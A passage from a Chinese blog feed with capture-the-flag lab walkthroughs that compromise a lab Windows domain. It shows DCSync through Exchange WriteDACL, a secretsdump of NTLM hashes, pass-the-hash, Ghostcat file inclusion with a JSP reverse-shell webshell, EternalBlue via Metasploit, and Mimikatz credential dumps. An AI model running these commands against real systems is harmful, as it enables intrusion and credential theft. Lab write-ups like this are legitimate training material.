Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.3.2 </span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 1 found</span><br><span class="line">                    [+] XIAORANG-EXC01$  ==&gt;&gt;&gt;  Exchange Server 2016  ==&gt;&gt;&gt;  172.22.3.9  </span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 59 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 27 found</span><br><span class="line">[i] User with Mail: 23 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 14 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 13 found</span><br><span class="line">[i] Users with passwords not set to expire: 13 found</span><br><span class="line">[i] Domain Computers: 3 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 3 found</span><br><span class="line">[i] Groups: 69 found</span><br><span class="line">[i] Domain OUs: 2 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw </span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 0 found</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 0 found</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-10-23 14:40:45 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in /Volumes/T7mac/Tools/内网渗透/ADinfo</span><br><span class="line">[i] Execution took 3.747006458s</span><br></pre></td></tr></table></figure><h3 id="writeDacl写DCSync">writeDacl写DCSync</h3><p>Exchange 机器账户默认对域内成员具有 WriteDACL 权限, 因此可以写 DCSync<br>exchange机器账户隶属于Exchange Windows Permissions这个组中，而这个组具有write 域内acl权限，所以可以设置刚刚通过mimikatz拿到的域内用户Zhangtong的dcsync属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-dacledit  xiaorang.lab/XIAORANG-EXC01\$ -hashes :2fe63e7825e4ed728e70f830881b5585 -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309225756170.png" class=""><p>然后直接使用zhangtong进行dcsync导出域管的hash打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  47.92.4.8:1236  ...  172.22.3.2:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  47.92.4.8:1236  ...  172.22.3.2:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.92.4.8:1236  ...  172.22.3.2:49667  ...  OK</span><br><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:23dfdc6125e86ea33eb1cb0531141909:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:35bfe7dfd4d17ac2818d87cbf05c329f:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:cf28d7adeb57b06ef0460084a015acf1:::</span><br><span class="line">XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:2fe63e7825e4ed728e70f830881b5585:::</span><br><span class="line">XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:ae45084adac3c5d85bca4b35253f7b53:::</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb administrator@172.22.3.2 -codec gbk</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309230312035.png" class=""><p>还差一台机器没有拿下，本来是跟之前一样横过去但是发现没有flag。那么使用smb去查看下有什么文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbclient.py xiaorang.lab/administrator@172.22.3.26 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309231343807.png" class=""><p>在Lumia用户的桌面上有一个压缩包，下载下来看看，打开需要密码。直接爆破也没有爆破出来去搜了大佬的博客发现是要去把该用户的邮件下载下来有手机号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9 --username Lumia --password &quot;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&quot; --action Download</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309231824730.png" class=""><img src="/post/e42dd187/IMAGE20250309231900404.png" class=""><p>通过john爆破zip的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john secret.zip&gt;zip.sec</span><br><span class="line">john zip.sec --format=pkzip --wordlist=phone.lst</span><br></pre></td></tr></table></figure><img src="/post/e42dd187/IMAGE20250309232255954.png" class=""><img src="/post/e42dd187/IMAGE20250309232432823.png" class=""><p>拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;还是用fscan扫下端口看看有啥 东西吗&lt;/p&gt;
&lt;img src=&quot;/post/e42dd187/IMAGE20250309213109841.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;发现有个ERP web服务看看&lt;/p&gt;
&lt;i</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Spoofing-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/8fbf5de0.html"/>
    <id>https://oceanzbz.github.io/post/8fbf5de0.html</id>
    <published>2025-03-09T05:49:16.000Z</published>
    <updated>2025-03-10T12:26:34.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>先来看fscan的扫描结果</p><img src="/post/8fbf5de0/IMAGE20250309135115773.png" class=""><p>看到开了8009 8080 端口先去看看web界面。</p><img src="/post/8fbf5de0/IMAGE20250309135224039.png" class=""><p>直接进了后台界面，但是没有什么功能界面。扫扫目录看看</p><img src="/post/8fbf5de0/IMAGE20250309135513339.png" class=""><p>貌似也没有什么，先看看。</p><img src="/post/8fbf5de0/IMAGE20250309135537125.png" class=""><p>发现了中间件的版本，在联想到开了8009端口，想到了一个cve漏洞。</p><h2 id="CVE-2020-1983-Tomcat文件包含">CVE-2020-1983 Tomcat文件包含</h2><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://<span class="number">39.99</span><span class="number">.139</span><span class="number">.181</span>:<span class="number">8080</span>/ <span class="number">8009</span> /WEB-INF/web.xml read</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | <span class="string">&#x27;_ \  \ \| &#x27;</span>_ \ / _ \ / _ \| __/ _ \ <span class="string">&#x27;__|</span></span><br><span class="line"><span class="string">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span></span><br><span class="line"><span class="string">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span></span><br><span class="line"><span class="string">         |__/|_|                                        </span></span><br><span class="line"><span class="string">                                                00theway,just for test</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[&lt;] 200 200</span></span><br><span class="line"><span class="string">[&lt;] Accept-Ranges: bytes</span></span><br><span class="line"><span class="string">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span></span><br><span class="line"><span class="string">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span></span><br><span class="line"><span class="string">[&lt;] Content-Type: application/xml</span></span><br><span class="line"><span class="string">[&lt;] Content-Length: 2489</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE web-app PUBLIC</span></span><br><span class="line"><span class="string"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="line"><span class="string"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;web-app&gt;</span></span><br><span class="line"><span class="string">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;security-constraint&gt;</span></span><br><span class="line"><span class="string">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;</span></span><br><span class="line"><span class="string">    &lt;web-resource-collection&gt;</span></span><br><span class="line"><span class="string">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;</span></span><br><span class="line"><span class="string">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="string">    &lt;/web-resource-collection&gt;</span></span><br><span class="line"><span class="string">    &lt;auth-constraint&gt;</span></span><br><span class="line"><span class="string">      &lt;role-name&gt;admin&lt;/role-name&gt;</span></span><br><span class="line"><span class="string">    &lt;/auth-constraint&gt;</span></span><br><span class="line"><span class="string">  &lt;/security-constraint&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;error-page&gt;</span></span><br><span class="line"><span class="string">    &lt;error-code&gt;404&lt;/error-code&gt;</span></span><br><span class="line"><span class="string">    &lt;location&gt;/404.html&lt;/location&gt;</span></span><br><span class="line"><span class="string">  &lt;/error-page&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;error-page&gt;</span></span><br><span class="line"><span class="string">    &lt;error-code&gt;403&lt;/error-code&gt;</span></span><br><span class="line"><span class="string">    &lt;location&gt;/error.html&lt;/location&gt;</span></span><br><span class="line"><span class="string">  &lt;/error-page&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;error-page&gt;</span></span><br><span class="line"><span class="string">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span></span><br><span class="line"><span class="string">    &lt;location&gt;/error.html&lt;/location&gt;</span></span><br><span class="line"><span class="string">  &lt;/error-page&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;servlet&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet&gt;</span></span><br><span class="line"><span class="string">  &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;servlet&gt;</span></span><br><span class="line"><span class="string">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet&gt;</span></span><br><span class="line"><span class="string">  &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;servlet&gt;</span></span><br><span class="line"><span class="string">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet&gt;</span></span><br><span class="line"><span class="string">  &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;servlet&gt;</span></span><br><span class="line"><span class="string">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet&gt;</span></span><br><span class="line"><span class="string">  &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;servlet&gt;</span></span><br><span class="line"><span class="string">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet&gt;</span></span><br><span class="line"><span class="string">  &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="string">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="string">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="string">  &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="string">&lt;/web-app&gt;</span></span><br></pre></td></tr></table></figure><p>先来读取一下配置文件，发现有一个上床的url访问一下</p><img src="/post/8fbf5de0/IMAGE20250309135959264.png" class=""><p>可以上传文件，那么咱们就可以进行文件包含了，先准备一个反弹shell的脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,xxxxxxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream(); <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>]; out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>); <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b)); &#125; out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>); %&gt;</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309140319393.png" class=""><p>进行包含</p><p><code>python3 ajpShooter.py http://39.99.139.181:8080/ 8009 /upload/abca1d7d040345028d1365a8881415e1/20250309020311368.txt eval</code></p><img src="/post/8fbf5de0/IMAGE20250309140443064.png" class=""><p>拿到了root的shell权限，这样就可以写后门用户公钥了。</p><img src="/post/8fbf5de0/IMAGE20250309140631860.png" class=""><h2 id="内网渗透">内网渗透</h2><p>还是先上传代理工具和fscan扫描下内网的信息。</p><img src="/post/8fbf5de0/IMAGE20250309141011867.png" class=""><p>发现内网有一个ms17-01漏洞，那么搭好代理直接上美少妇干他。</p><h3 id="ms17-010">ms17-010</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole </span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid </span><br><span class="line">set RHOSTS 172.22.11.45 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309141559252.png" class=""><p>直接找flag就行</p><img src="/post/8fbf5de0/IMAGE20250309141817573.png" class=""><p>收集下内网信息，为打后面的域做个铺垫，先抓下hash看看有没有域用户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309142220483.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XR-DESKTOP$  XIAORANG  0a124be3aa98d6f8499eb0ea8df3c355  c3d51ffd58887017bc5c2e90d1204a33e0ed7488</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br><span class="line">xr-desktop$  XIAORANG.LAB  (null)</span><br><span class="line">yangmei      XIAORANG.LAB  xrihGHgoNZQ</span><br></pre></td></tr></table></figure><p>既然有一个域用户那就收集下域内的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./proxychains4 -f proxychains.conf ../ADinfo/Adinfo_darwin -d xiaorang.lab --dc 172.22.11.6 -u yangmei -H 25e42ef4cc0ab6a8ff9e3edbbda91841</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa</span><br><span class="line"></span><br><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \| 